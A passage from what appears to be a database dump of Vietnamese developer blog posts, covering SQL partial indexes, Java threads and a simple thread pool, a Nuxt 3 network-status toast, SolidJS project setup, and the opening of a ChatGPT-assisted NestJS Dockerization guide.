       WHERE processed = ''N''
```

Chỉ những row thỏa mãn điều kiện WHERE mới được index, rất tiết kiệm ổ cứng, hơn nữa trọng index không cần thêm trường processed nữa vì nó luôn luôn bằng ''N'' vừa tiết kiệm số lượng bản ghi index lại tiết kiệm thêm kích thước từng dòng trong index.  Cả hai chiều row và column.

Số lượng index trở lên rất nhỏ, với trường hợp queue số lượng index còn không tăng lên dù số lượng bản ghi tăng lên nhiều đi nữa, vì trạng thái processed = ''N'' thường dao động quanh một con số nào đó, chỉ những bản ghi chưa được xử lý mà thôi. Còn số lượng bản ghi có xử lý có lớn bao nhiêu cũng không ảnh hưởng tới kích thước index.

Điều kiện trong cấu WHERE có thể phức tạp tùy ý, tuy nhiên cần chú ý một điều nếu dùng hàm trong WHERE thì hàm đó phải là deterministic  nghĩa là với cùng một đầu vào luôn có cùng kết quả đầu ra (Những hàm như GetDate() không phải là deterministic vì kết quả khác nhau mỗi lần gọi).

```
Nghĩ một chút
Câu truy vấn dưới đây thì nên dùng index như thế nào là tốt nhât?

SELECT message
  FROM messages
 WHERE processed = ''N''
```

Các bạn có thể Join hai group này để cùng xây dựng cộng đồng lập trình viên level quốc tế nhé

[Facebook](https://www.facebook.com/groups/3277228842495302)', '2023-02-05T16:06:10.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-10T09:40:06.000000Z'),
	('Thread, Thread Pool, Thread Notify trong Java', 'GAWVpd3kV05', '11', 'public', 'https://images.viblo.asia/c7650344-385f-48a5-acf2-932fb6b2486e.png', 'Giới thiệu
Trong bài viết này chúng ta cùng tìm hiểu về Thread, Multi Thread, Daemon Thread, Deadlock, Life Cycle.... hiểu và vận dụng thread vô thực tế. GetGoooo.....
* Nội dung của bài viết được hỗ trợ 1 phần bởi ChatGPT

Định nghĩa
Thread là một thuộc tính duy nhất của Java. Nó là đơn vị nhỏ nhất của đoạn mã có thể thi hành được mà thực hiện một công việc riêng biệt. Ngôn ngữ Java và máy ảo ...', '# Giới thiệu
Trong bài viết này chúng ta cùng tìm hiểu về Thread, Multi Thread, Daemon Thread, Deadlock, Life Cycle.... hiểu và vận dụng thread vô thực tế. GetGoooo.....
* Nội dung của bài viết được hỗ trợ 1 phần bởi ChatGPT

# Định nghĩa
**Thread** là một thuộc tính duy nhất của Java. Nó là đơn vị nhỏ nhất của đoạn mã có thể thi hành được mà thực hiện một công việc riêng biệt. Ngôn ngữ Java và máy ảo Java cả hai là các hệ thống đươc phân luồng.

**Multi Thread**
+ Java hổ trợ đa luồng, mà có khả năng làm việc với nhiều luồng. Một ứng dụng có thể bao hàm nhiều luồng
+ Đa luồng giữ thời gian nhàn rỗi của hệ thống thành nhỏ nhất( tức vắt kiệt luôn =))). Điều này cho phép bạn viết các chương trình có hiệu quả cao với sự tận dụng CPU là tối đa. Mỗi phần của chương trình được gọi một luồng, mỗi luồng định nghĩa một đường dẫn khác nhau của sự thực hiện. Đây là một thiết kế chuyên dùng của sự đa nhiệm.
+ Trong sự đa nhiệm, nhiều chương chương trình chạy đồng thời, mỗi chương trình có ít nhất một luồng trong nó. Một vi xử lý thực thi tất cả các chương trình. Cho dù nó có thể xuất hiện mà các chương trình đã được thực thi đồng thời, trên thực tế bộ vi xử lý nhảy qua lại giữa các tiến trình.

Lý thuyết sẽ là như thế, mình cùng vô thực hành để hiểu hơn về Thread nhen!

# Tạo và quản lý Thread
Khi các chương trình Java được thực thi, luồng(Thread) chính luôn luôn đang được thực hiện, nó được tạo ra một cách tự động khi bạn start chương trình, các luồng con thường sẽ được tạo thông qua nó, nó cũng là luồng kết thuốc cuối cùng của chương trình

để tạo ra Thread, thường sẽ có 2 cách
1. Sử dụng Thread
 ```
 Class HanhGa extends Thread {
    public void run() {
    //thực thi
    }
}
 ```
2.Sử dụng Runnable
 ```
 Class HanhGa implements Runnable {
    public void run() {
    //thực thi
    }
}
 ```

 Có 1 vài sự khác biệt khi bạn sử dụng Runnable và Thread
 1. Runnable là một interface trong Java, còn Thread là một class implement từ Runnable. Nếu muốn tạo một luồng mới, bạn có thể implement interface Runnable hoặc kế thừa từ class Thread.
 2. Runnable chỉ cung cấp một phương thức run() để chạy một tác vụ, trong khi Thread cung cấp nhiều phương thức khác để điều khiển luồng, chẳng hạn như start(), interrupt(), join() và sleep().
 3. Runnable có thể được sử dụng trong nhiều trường hợp, trong khi Thread chỉ có thể sử dụng trong một số trường hợp cụ thể. Do đó, sử dụng Runnable là một lựa chọn tốt hơn trong trường hợp muốn chạy nhiều luồng với cùng một tác vụ.

Ok giờ cùng thực thực hiện 1 chương trình và phân tích về nó

```
public class HanhGa extends Thread {
    public static void main(String[] args) {
        Thread t = Thread.currentThread();
        System.out.println("The current Thread is :" + t);
        t.setName("HanhGa");
        System.out.println("The thread is now named: " + t);
    }
}
```
![image.png](https://images.viblo.asia/c7650344-385f-48a5-acf2-932fb6b2486e.png)

Trích xuất từ kết quả
![image.png](https://images.viblo.asia/a6c2e902-228a-4c2a-b170-d029a9121137.png)


Mỗi luồng trong chương trình Java được đăng ký cho một quyền ưu tiên. Máy ảo Java không bao giờ thay đổi quyền ưu tiên của luồng. Quyền ưu tiên vẫn còn là hằng số cho đến khi luồng bị ngắt.

Mỗi luồng có một giá trị ưu tiên nằm trong khoảng từ Thread.MIN_PRIORITY đến Thread.MAX_PRIORITY tức 1-10. Mỗi luồng phụ thuộc vào một nhóm luồng, và mỗi nhóm luồng có quyền ưu tiên riêng thường thì bằng 5.

![image.png](https://images.viblo.asia/9fae9ca6-3eca-4012-9802-f75397013b4a.png)
Lượn lờ trên mạng thì mình tìm được chiếc hình cũ kỹ này thể hiện được vòng đời của Thread.

# Trạng thái của Thread
1 Thread trong Java thường tồn tại 6 trạng thái

**New**: Thread đã được tạo nhưng chưa được chạy.

**Runnable**: Thread đang chạy hoặc đang chờ CPU để được thực thi.

**Blocked**: Thread bị chặn khi đang chờ một đối tượng được sử dụng bởi một thread khác.

**Waiting**: Thread đang chờ một sự kiện xảy ra hoặc một thread khác gửi một thông báo cho nó.

**Timed waiting**: Thread đang chờ một số thời gian nhất định.

**Terminated**: Thread đã kết thúc hoặc bị tắt bất cẩn.

Một luồng khi được tạo ra sẽ không tự động chạy mà cần được được gọi qua phương thức start().

Khi phương thức sleep() được gọi, nó sẽ được tạm ngưng và quay về trạng thái Waiting

**Một số hàm thông dụng của Thread.**

**getName()** lấy tên Thread.

**isAlive()** trả về True nếu Thread còn tồn tại.

**getPriority()** trả về điểm ưu tiên của Thread.

**setName()**  set tên cho Thread.

**join()** hàm này sẽ chờ cho đến khi Thread của bạn chết.

**isDaemon()** có phải Thread Daemon(Luồng Hiếm) hay không.

**resume()** đánh dấu luồng là luồng hiếm(Daemon).

**sleep()** tạm ngưng thực thi.

**start()** Gọi phương thức run() để bắt đầu một luồng.
# Luồng hiếm (Daemon Thread)
Daemon Thread hay còn có cái tên thân thiện hơn và luồng hiếm được chỉ định như là luồng "background" (nền). Người sử dụng tạo ra các luồng người sử dụng và cung cấp các "dịch vụ" cho luồng khác.

Trong Java thì luôn có ít nhất 1 luồng hiếm tồn tại nó được biết đến như là luồng "garbage collection" (thu lượm những dữ liệu vô nghĩa - dọn rác)

Bạn có thể dùng phương thức setDaemon để chỉ định 1 Thread là Thead hiếm. :D

# Ví dụ Thread Notify, Thread Pool đơn giản
Chúng ta cùng làm một ví dụ đơn giản về Thread nha.

Trong ví dụ này chúng ta sẽ tạo ra 1 Thread Pool, và khi Thread hoàn thành chúng ta sẽ bắn notify để thông báo.

 Ok! bắt đầu thôi....

 Để Thread có thể đăng ký các Listener, mình sẽ tạo ra một Thread mới implements từ `Runnable`

 ```
 import java.util.Set;
import java.util.concurrent.CopyOnWriteArraySet;

public abstract class NotifyingThread implements Runnable {
  private final Set<ThreadCompleteListener> listeners
          = new CopyOnWriteArraySet<ThreadCompleteListener>();

  public final void addListener(final ThreadCompleteListener listener) {
    listeners.add(listener);
  }

  public final void removeListener(final ThreadCompleteListener listener) {
    listeners.remove(listener);
  }

  private void notifyListeners() {
    for (ThreadCompleteListener listener : listeners) {
      listener.notifyOfThreadComplete(this);
    }
  }

  @Override
  public final void run() {
    try {
      doRun();
    } finally {
      notifyListeners();
    }
  }

  public abstract void doRun();
  public abstract void startThread();
  public abstract Thread getThread();
}
 ```

Tạo interface `ThreadCompleteListener` để các Listener implements lại.


```
public interface ThreadCompleteListener {
  void notifyOfThreadComplete(final Runnable thread);
}
```

Tạo một class để quản lý Thread

```
public class ThreadStart extends NotifyingThread {

  Supplier<Object> supplier;
  VoidSupplier supplierVoid;
  String supplierMode = "object";

  Thread t;
  public ThreadStart(Supplier<Object> func) {
    t = new Thread(this, func.getClass().getName() + new Random().nextInt());
    supplier = func;
    supplierMode = "object";
  }
  public ThreadStart(VoidSupplier func) {
    t = new Thread(this, func.getClass().getName() + new Random().nextInt());
    supplierVoid = func;
    supplierMode = "void";
  }
  @Override
  public void startThread(){
    t.start();
  }

  @Override
  public Thread getThread(){
    return t;
  }
  @Override
  public void doRun() {
    try {
      if (supplierMode.equals("object"))
        supplier.apply();
      else
        supplierVoid.apply();
    } catch (Throwable e) {
      e.printStackTrace();
    }
  }
}
```
* VoidSupplier thì cũng là một FunctionalInterface tương từ Supplier thôi nhé.

Ok giờ mình cùng test thôi.

```
NotifyingThread thread = new ThreadStart(() -> new ClassRunThread().process());
thread.addListener(new ClassReceiveNotify());
thread.startThread();
```

trong đó `ClassRunThread` là class chúng đa muốn chạy trong Thread mới,  `ClassReceiveNotify` được implements ThreadCompleteListener để nhận thông báo.

![Screenshot 2023-02-05 at 21.37.29.png](https://images.viblo.asia/1a579603-33fe-42a4-8a77-48173596f4a3.png)

và đây là kết quả chúng ta nhận được.

Nâng cao hơn 1 tí nào, chúng ta cùng tạo thêm cho nó cái Pool để quản lý lượng Thread được tạo ra nha.

*Lưu ý: Việc tạo này để giúp các bạn hiêu hơn về Thread, trên thực tế các ThreadPool có độ phức tạp cao hơn hoặc bạn có thể sử dụng các lớp được cung cấp bởi java.util.concurrent như **ExecutorService**, **Semaphore** hoặc **CountDownLatch** để kiểm soát luông tốt hơn.

```
public class ThreadPool implements ThreadCompleteListener {

  public ThreadPool(int maxThread) {
    ThreadPool.maxThread = maxThread;
  }
  public ThreadPool(int maxThread, ThreadCompleteListener... event) {
    ThreadPool.maxThread = maxThread;
    ThreadPool.event = event;
  }

  public void run(Supplier<Object> supplier) {
    try {
      while (ThreadPool.currentThread >= ThreadPool.maxThread){
        Thread.sleep(100);
      }
      setCurrentThread(1);
      NotifyingThread thread1 = new ThreadStart(supplier);
      thread1.addListener(this);
      if (event != null) {
        for (var e : event){
          thread1.addListener(e);
        }
      }
      thread1.startThread();
    } catch (Throwable e) {
      e.printStackTrace();
    }
  }

  public void run(VoidSupplier supplier) {
    try {
      while (ThreadPool.currentThread >= ThreadPool.maxThread){
        Thread.sleep(300);
      }
      setCurrentThread(1);
      NotifyingThread thread1 = new ThreadStart(supplier);
      thread1.addListener(this);
      if (event != null) {
        for (var e : event){
          thread1.addListener(e);
        }
      }
      thread1.startThread();
    } catch (Throwable e) {
      e.printStackTrace();
    }
  }

  protected static volatile int maxThread = 5;
  protected static volatile ThreadCompleteListener event[] = null;
  protected static volatile int currentThread = 0;
  private static synchronized int threadCount() {
    return maxThread;
  }
  private static synchronized int setCurrentThread(int t) {
    return currentThread = currentThread + t;
  }

  public static int getCurrentThread() {
    return currentThread;
  }

  public static int getMaxThread() {
    return maxThread;
  }
  @Override
  public void notifyOfThreadComplete(Runnable thread) {
    setCurrentThread(-1);
  }
}
```
Trong class phía trên mình sẽ lưu số lượng Thread đang chạy trong currentThread, mình coi ThreadPool như là một Listener để nhận được thông báo khi Thread hoàn thành và điều chỉnh currentThread lại.

Trong ví dụ trên, mình dùng hàm sleep để tạm ngưng 100ms khi currentThread > maxThread. (sẽ có thêm nhiều cách khác để bạn làm, ví dụ như đưa vào Queue.... trong ví dụ đơn này này mình sleep cho lẹ nhé =)) )

Ok! tiếp theo mình tạo thêm một cái Builder nữa cho nó chuyên nghiệp nha :D

```
public class ThreadBuilder {

  int maxThread;
  ThreadCompleteListener event[];

  public static ThreadBuilder newBuilder() {
    return new ThreadBuilder();
  }

  public ThreadBuilder withMaxThread(int maxThread) {
    this.maxThread = maxThread;
    return this;
  }

  public ThreadBuilder withMaxThread(ThreadCompleteListener... event) {
    this.event = event;
    return this;
  }

  public ThreadPool build() {
    if (event == null)
      return new ThreadPool(maxThread);
    return new ThreadPool(maxThread, event);
  }
}
```

Giờ mình cùng xem thành quả nha.

```
ThreadPool run = ThreadBuilder.newBuilder().withMaxThread(2).withMaxThread(new ClassReceiveNotify()).build();
run.run(() -> new ClassRunThread().process(1));
run.run(() -> new ClassRunThread().process(2));
run.run(() -> new ClassRunThread().process(3));
run.run(() -> new ClassRunThread().process(4));
```

Mình tạo ThreadPool với số max là 2, nhưng mình chạy cùng lúc 4 Thread và hình dưới là kết quả

![Screenshot 2023-02-05 at 21.55.09.png](https://images.viblo.asia/75eec88a-8365-49a8-a579-5f3643f39b62.png)

như các bạn đã thấy `process 1` và `process 2` được xử lý cùng lúc, trong khi `process 3` và `process 4` thì cần phải chờ vì Pool size chỉ cho phép 2.

# Kết luận
Trong bài viết này mình đã đi qua lý thuyết về Thread, làm ví dụ đơn giản về Thread được mình chích ra từ các dự án thực tế và làm đơn giản lại để các bạn dễ hiểu.

Cảm ơn các bạn đã xem bài, nếu có sai xót gì trong content, mình mong nhận được ý kiến đóng góp từ mọi người', '2023-02-05T15:18:07.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-07T09:58:24.000000Z'),
	('[FE] [Nuxt3] [Tip] [Network] Làm chức năng hiển thị tình trạng kết nối mạng', 'y3RL1aWoLao', '1', 'public', 'https://images.viblo.asia/6d8a1f23-f47c-4713-85fd-fb98c4fd2898.png', 'Intro

(Chức năng hiện thông báo khi đổi mạng)

Nếu các bạn xài mạng xã hội thì cũng hay gặp trường hợp mạng bị mất và xuất hiện dòng chữ thông báo về tình trạng mạng của mình ,Mục đích bài viết này chúng ta sẽ cùng nhau xem làm thử bảng thông báo như nào nhé

Lưu ý :
* Để tránh trường hợp báo window not define đối với dự án SSR thì bạn nên thêm thẻ <ClientOnly>  bọc lại nhé nhé

- Kiểm tra trì...', '### Intro

![](https://images.viblo.asia/94fa60cd-1bcd-48a2-b26c-e29fadac12f9.gif)

*<div align="center">(Chức năng hiện thông báo khi đổi mạng)</div>*

Nếu các bạn xài mạng xã hội thì cũng hay gặp trường hợp mạng bị mất và xuất hiện dòng chữ thông báo về tình trạng mạng của mình ,Mục đích bài viết này chúng ta sẽ cùng nhau xem làm thử bảng thông báo như nào nhé

Lưu ý :
* Để tránh trường hợp báo **window not define** đối với dự án SSR thì bạn nên thêm thẻ `<ClientOnly> ` bọc lại nhé nhé

- Kiểm tra trình duyệt hỗ trợ trước khi integrate vào dự án nhé :D
![](https://images.viblo.asia/6d8a1f23-f47c-4713-85fd-fb98c4fd2898.png)

### Lý thuyết

Ở đây chúng ta sẽ sử dụng thuộc tính [navigator của window](https://developer.mozilla.org/en-US/docs/Web/API/Window/navigator) , nó cho phép chúng ta biết được chi tiết về network của client ví dụ như tình trạng mạng, loại mạng sử dụng (2g,3g,4g..) , tốc độ tải . Các bạn có thể đọc thêm tại navigator [**ở đây **](https://developer.mozilla.org/en-US/docs/Web/API/Window/navigator)

### Code

Mình sẽ sử dụng Nuxt 3 để code cho phần này

Chúng ta tiến hành dựng sườn cho phần toast thông báo
```html
// components/toasNetwork.vue

<div class="toast">
      <div class="content">
        <div class="icon">
          <i class="uil uil-wifi"/>
        </div>
        <div class="details" >
          <span>You''re online now</span>
          <p>Hurray! Internet is connected.</p>
        </div>
      </div>
    </div>
```

**Phần Style**: Code style cho component , cũng như thêm hiệu ứng
```css
@import url(''https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap'');
@import url(''https://unicons.iconscout.com/release/v3.0.6/css/line.css'');

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: ''Poppins'', sans-serif;
}

body {
  overflow: hidden;
  background: #f2f2f2;
}

.page {
  position: relative;
  min-height: 100vh;
  min-width: 100vw;
  background-image: url(https://i.ibb.co/4fMB4tr/background-demo.png);
  background-size: 100% auto;
  background-repeat: no-repeat;
  background-position: center -3px;
}

.wrapper {
  position: absolute;
  top: 20px;
  left: 20px;
}

@keyframes show_toast {
  0% {
    transform: translateX(-100%);
  }

  40% {
    transform: translateX(10%);
  }

  80%,
  100% {
    transform: translateX(20px);
  }
}

.wrapper.hide {
  animation: hide_toast 1s ease forwards;
}

.wrapper.show {
  animation: show_toast 1s ease forwards;
}

@keyframes hide_toast {
  0% {
    transform: translateX(20px);
  }

  40% {
    transform: translateX(10%);
  }

  80%,
  100% {
    opacity: 0;
    pointer-events: none;
    transform: translateX(-100%);
  }
}

.wrapper .toast {
  background: #fff;
  padding: 20px 15px 20px 20px;
  border-radius: 10px;
  border-left: 5px solid #2ecc71;
  box-shadow: 1px 7px 14px -5px rgba(0, 0, 0, 0.15);
  width: 430px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.wrapper .toast.offline {
  border-color: #ccc;
}

.toast .content {
  display: flex;
  align-items: center;
}

.content .icon {
  font-size: 25px;
  color: #fff;
  height: 50px;
  width: 50px;
  text-align: center;
  line-height: 50px;
  border-radius: 50%;
  background: #2ecc71;
}

.toast.offline .content .icon {
  background: #ccc;
}

.content .details {
  margin-left: 15px;
}

.details span {
  font-size: 20px;
  font-weight: 500;
}

.details p {
  color: #878787;
}

.toast .close-icon {
  color: #878787;
  font-size: 23px;
  cursor: pointer;
  height: 40px;
  width: 40px;
  text-align: center;
  line-height: 40px;
  border-radius: 50%;
  background: #f2f2f2;
  transition: all 0.3s ease;
}

.close-icon:hover {
  background: #efefef;
}
```

**Composable** : Ở đây mình sẽ tách phần logic qua Composable là `useNetWork.ts` để sau này có thể tái sử dụng , đây là 1 chức năng hay của Nuxt 3 mình rất thích

```javascript
// Composables for Network
// composables/useNetWork.ts

export default function useNetwork(timeDuration = 2000) {
  const navigator = window.navigator;
  const isOnline = ref(navigator.onLine);
  const isShow = ref(false);

  //Tiến hành xe
  window.addEventListener(''online'', () => {
    isOnline.value = true;
  });

  window.addEventListener(''offline'', () => {
    isOnline.value = false;
  });

  const hideToast = (time = 2000) => {
    setTimeout(() => {
      isShow.value = false;
    }, time);
  };

 // Khi chúng ta bắt được sự kiện thay đổi mạng (isOnline) ở phía trên chúng ta sẽ tiến hành hiện popup và tắt popup theo thời gian mong muốn với timeDuration

  watch(isOnline, () => {
    //Chỗ này mình mong muốn là sẽ phải tắt thuộc tính show trước khi mở lại toast tránh trường hợp người dùng đang được mở popup sẽ ko có animation

    isShow.value = false;
    nextTick(() => {
      isShow.value = true;
      hideToast(timeDuration);
    });
  });

  // Ở đây mình sử dụng readonly để tránh trường hợp edit được 2 trạng thái này bên ngoài , chỗ này các bạn có thể bỏ không nếu muốn
  return { isOnline: readonly(isOnline), isShow: readonly(isShow) };
}

```

Sau khi thêm phần logic xong thì quay lại phần template để gắn phần logic vào thôi
```html

// components/toasNetwork.vue
<template>
  <div class="page">
    <div :class="[''wrapper'', isShow ? ''show'' : ''hide'']">
      <ClientOnly>
        <div :class="[{ offline: !isOnline }, ''toast'']">
          <div class="content">
            <div class="icon">
              <i
                :class="[''uil'', isOnline ? ''uil-wifi'' : '' uil-wifi-slash'']"
              ></i>
            </div>
            <div class="details" v-if="isOnline">
              <span>You''re online now</span>
              <p>Hurray! Internet is connected.</p>
            </div>

            <div class="details" v-else>
              <span>You''re offline now</span>
              <p>Opps! Internet is disconnected.</p>
            </div>
          </div>
        </div>
      </ClientOnly>
    </div>
  </div>
</template>

<script lang="ts" setup>
const { isOnline, isShow } = useNetwork(3000);
</script>
```

Vậy là xong rồi tận hưởng thành quả thôi :D .

Hẹn gặp lại vào các bài viết tiếp theo see ya !!

*Nguồn :*

HTML/CSS :  https://gosnippets.com/full-screen/toast-notification-to-detect-internet-connection-in-html-css-javascript

Learnvue : https://www.youtube.com/watch?v=4M6D9_ALczY&t=209s&ab_channel=LearnVue', '2023-02-05T12:21:52.000000Z', '2023-02-25T09:01:04.000000Z', '2023-02-05T12:23:22.000000Z'),
	('Series SolidJS - Tập 2: Khởi tạo project SolidJS và cùng xem có gì trong đó nhé.', 'yZjJYz2bLOE', '2', 'public', 'https://images.viblo.asia/904dde39-ee05-4f3c-98ba-777683687124.png', 'Giới thiệu
Hello everyone, chúng ta lại gặp nhau nữa rồi ✌️

Tập trước trong series mình đã chia sẻ những thông tin xung quanh quanh công nghệ SolidJS.

Ở tập này mình và các bạn sẽ cùng nhau khởi tạo project cơ bản bằng SolidJS và phân tích vào các chức năng đã được giới thiệu ở tập trước nhé.

Nội dung

Đây là nội dung mình sẽ giới thiệu trong tập này, let''s go 🔥

* 🖥️ Khởi tạo project SolidJ...', '## Giới thiệu
Hello everyone, chúng ta lại gặp nhau nữa rồi ✌️

Tập trước trong series mình đã chia sẻ những thông tin xung quanh quanh công nghệ **[SolidJS](https://www.solidjs.com/)**.

Ở tập này mình và các bạn sẽ cùng nhau khởi tạo project cơ bản bằng **[SolidJS](https://www.solidjs.com/)** và phân tích vào các chức năng đã được giới thiệu ở tập trước nhé.

## Nội dung

Đây là nội dung mình sẽ giới thiệu trong tập này, let''s go 🔥

* 🖥️ Khởi tạo project SolidJS (sử dụng **Vite**): https://github.com/solidjs/templates
* 🎬 Vọc vạch về **[JSX - Javascript XML](https://www.solidjs.com/tutorial/introduction_jsx)** trong SolidJS
* 🚛 Cách hoạt động cơ bản của ứng dụng SolidJS

-----

###  Khởi tạo project **SolidJS**:

Mình sẽ tạo project **[SolidJS](https://www.solidjs.com/)** (sử dụng **[Vite](https://vitejs.dev/)**) đi với **Javascript** thuần nhé.

📝 Note: **[Vite](https://vitejs.dev/)** là một **Frontend Build Tool** giúp thực hiện việc khởi tạo và setup các project FE nhanh chóng và dễ dàng ⚡️ (Vite được tạo ra bởi cha đẻ của **VueJS** - **Evan You**)


```bash
# Create an app from a Solid template (Tạo mới ứng dụng từ Solid template)
npx degit solidjs/templates/js my-app

# Change directory to the project created (Di chuyển đến thư mục ứng dụng đã tạo)
cd my-app

# Install dependencies (Cài đặt các thành phần cần thiết để start ứng dụng)
npm i # or yarn or pnpm

# Start the dev server (Chạy ứng dụng trên môi trường dev)
npm run dev
```

>  https://github.com/solidjs/templates có hỗ trợ TypeScript, vì vậy nếu bạn muốn bắt đầu tạo project với TypeScript, hãy thay đổi câu lệnh thành `npx degit solidjs/templates/ts my-app`.


Đây là thành quả sau khi đã chạy lệnh `npm run dev` thành công nhé *(truy cập vào đường dẫn http://localhost:3000/)*

![](https://images.viblo.asia/904dde39-ee05-4f3c-98ba-777683687124.png)

*Cấu trúc thư mục:*
![](https://images.viblo.asia/71d21243-bd47-46d7-9381-bb8456f6df27.png)

Nếu bạn đã từng học qua **[ReactJS](https://reactjs.org/)** và có biết đến câu thần chú `create-react-app` thì sẽ thấy cấu trúc source code, syntax của **[SolidJS](https://www.solidjs.com/)** quen thuộc đúng không nào?

Đúng vậy bạn không nhầm đâu, cả ReactJS lẫn SolidJS đều khá giống nhau đấy kkk 😂


### Vọc vạch về **[JSX - Javascript XML](https://www.solidjs.com/tutorial/introduction_jsx)**

Hãy cùng mình xem 1 ví dụ bên dưới nhé

```jsx
import { render } from "solid-js/web";

const HelloEveryone = () => {
    return <div>Hello everyone, my name is Pate Kem.</div>;
}

render(
 () => <HelloEveryone/>,
 document.getElementById("root")
);
```

Trong hình trên bạn hãy chú ý đến hàm **`HelloEveryone`**, nó trực tiếp trả về một thẻ **`<div> nội dung...  </div>`** có chứa nội dụng bên trong.

Mỗi ứng dụng SolidJS sẽ bao gồm các chức năng được gọi là các thành phần (**Components**).

Đó là sự kết hợp giữa **HTML** và **JavaScript** được gọi là **JSX**. Solid sẽ vận chuyển chúng đi qua một trình biên dịch để biến các thẻ này thành các nút DOM (DOM nodes) hiển thị lên giao diện.

**JSX** cho phép bạn sử dụng hầu hết các phần tử **HTML**, nó cũng cho phép bạn tạo ra các phần tử mới. Khi chúng ta đã khai báo hàm **`HelloEveryone`**, chúng ta có thể sử dụng nó làm thẻ **`<HelloEveryone>`** trong chính ứng dụng của mình (*hay còn gọi là **Component***).


### Cách hoạt động cơ bản của ứng dụng **SolidJS**

Mình sẽ dùng lại code mẫu ở trên để miêu tả cụ thể cách thức hoạt động đơn giản của nó nhé.


```jsx
import { render } from "solid-js/web";

const HelloEveryone = () => {
    return <div>Hello everyone, my name is Pate Kem.</div>;
}

render(
 () => <HelloEveryone/>,
 document.getElementById("root")
);
```

Ở đây chúng ta sẽ thấy được hàm **`render`** có cú pháp (syntax) tương tự như hàm **`render`** trong **ReactJS** 👀

Đây là hàm chức năng chính của **SolidJS** để kết xuất lại **Components** sau đấy thể hiện trên giao diện ứng dụng (**DOM - Document Object Model**)

Chúng ta cần cung cấp **2 đối số** cho hàm **`render`**:

* Một **Component** đóng gói mã ứng dụng
* Một phần tử hiện có trong giao diện **HTML** để gắn vào

```jsx
render(
 () => <HelloEveryone/>, // đối số 1
 document.getElementById("root") // đối số 2
);
```

![](https://images.viblo.asia/ff9a3adc-07d8-4bb1-bfa1-2262c287cfe1.png)
> Các bạn hãy mở file `index.jsx` + file `index.html` trong source vừa tạo và bạn sẽ thấy thẻ `<div id="root"></div>`, đó chính là nơi sẽ render ra ứng dụng của bạn.


Dựa theo đoạn code trên, nó sẽ được **SolidJS** biên dịch thành các biểu thức trên **DOM** thực, trông nó sẽ giống như sau:

```jsx
import { template, render, createComponent } from "solid-js/web";

const _tmpl = template(`<div>Hello everyone, my name is Pate Kem.</div>`, 2);

const HelloEveryone = () => {
  return _tmpl.cloneNode(true);
};

render(
  () => createComponent(HelloEveryone, {}),
  document.getElementById("root")
);
```

> [Solid Playground](https://playground.solidjs.com/) khá thú vị khi cho ta thấy **SolidJS** có nhiều cách khác nhau để `render`: *CSR - Client side rendering, SSR - Server side rendering, Client side rendering with hydration.*

## Tổng kết lại tập 2 thôi nào

Ở tập 2 này chúng ta đã bắt đầu tìm hiểu về syntax code và cách 1 ứng dụng SolidJS hoạt động cơ bản như thế nào 😎

Trong tập sau mình sẽ cùng đi vào phần tiếp theo về **Reactivity primitives** nhé:
* 📥 **[Reactivity primitives](https://www.solidjs.com/guides/reactivity)**
    - *Signals*
    - *Effects*
    - *Memo*

Cảm ơn các bạn đã theo dõi tập 2 trong series về **[SolidJS](https://www.solidjs.com/)**. Nếu các bạn có thắc mắc hoặc góp ý về bài viết hãy **comment** giúp mình nhé, cảm ơn các bạn 😘

Series SolidJS - Tập 3: https://viblo.asia/p/series-solidjs-tap-3-reactivity-primitives-trong-solidjs-BQyJKjQW4Me

### Tham khảo
* https://github.com/solidjs/templates
* https://www.solidjs.com/guides/getting-started
* https://www.solidjs.com/tutorial/introduction_basics', '2023-02-05T12:13:26.000000Z', '2023-02-28T04:05:03.000000Z', '2023-02-23T09:36:34.000000Z'),
	('Dockerizing LTI NestJS trong Canvas LMS với sự hỗ trợ của ChatGPT', '5OXLAobr4Gr', '3', 'public', 'https://images.viblo.asia/ff23089c-68cc-45be-8d63-0e935c5fb75d.png', 'Xin chào các bạn, dạo gần đây ChatGPT đang nổi lên như một thế lực trong giang hồ, vừa hay hôm qua có bác chia sẻ cách đăng ký tài khoản khá đơn giản. Mình có đăng ký và dùng thử thì cũng thấy thật sự kinh ngạc vì sự tiện lợi mà nó mang lại.

Hôm nay mình sẽ Dockerizing LTI Absense Request mà lần trước chúng ta đã tạo và kết hợp với sự trợ giúp từ ChatGPT.

Thời điểm hiện tại mình đang dùng cho...', 'Xin chào các bạn, dạo gần đây **ChatGPT** đang nổi lên như một thế lực trong giang hồ, vừa hay hôm qua có bác chia sẻ cách đăng ký tài khoản khá đơn giản. Mình có đăng ký và dùng thử thì cũng thấy thật sự kinh ngạc vì sự tiện lợi mà nó mang lại.

Hôm nay mình sẽ **Dockerizing** **[LTI Absense Request](https://viblo.asia/p/viet-1-lti-don-gian-dung-nestjs-va-reactjs-trong-canvas-lms-5pPLkP76VRZ)** mà lần trước chúng ta đã tạo và kết hợp với sự trợ giúp từ **ChatGPT**.

Thời điểm hiện tại mình đang dùng cho bài viết này:
* Ubuntu 20.04
* Docker version 20.10.7, build f0df350
* docker-compose version 1.26.2, build eefe0d31
* ChatGPT Jan 30 Version
# Tạo Dockerfile và docker-compose file với ChatGPT
Sau nhiều lần thử nghiệm với các câu hỏi khác nhau, khá bất ngờ là mỗi lần đều cho mình một kết quả gần chính xác với yêu cầu, cuối cùng mình thấy kết quả cho câu hỏi này khá là thích hợp:
> Please help me create a scenario to Dockerizing a NestJS project and Mongodb with docker-compose. Please use node:18.12.1-bullseye-slim for Dockerfile. NestJS run on port 3333, Mongodb has basic auth.  Both of these services must use the same network. They all read .env file from current directory and have unless-stopped restart option.

![image.png](https://images.viblo.asia/c53aac1e-1406-4e84-b72d-b9807e289b6a.png)
![image.png](https://images.viblo.asia/419b907b-609c-440f-9802-687ddcbad2a4.png)

* File Dockerfile thì khá ổn, còn docker-compose thì mình thấy thiếu tên container và **Nestjs** service vẫn chưa depend service **Mongodb** khởi chạy nên mình sẽ yêu cầu **ChatGPT** cập nhật lại:

> Add container name to services in docker-compose. NestJS must depend on mongodb. Mongodb service read .env file from current directory to use in docker-compose file.

![image.png](https://images.viblo.asia/81e4b78a-8351-4a56-ba6d-1d38f982f7c0.png)

* Trông cũng khá là ổn, mình sẽ copy qua đây để các bạn có thể dễ thao tác:

**Dockerfile**

```Dockerfile
# Use node:18.12.1-bullseye-slim as the base image
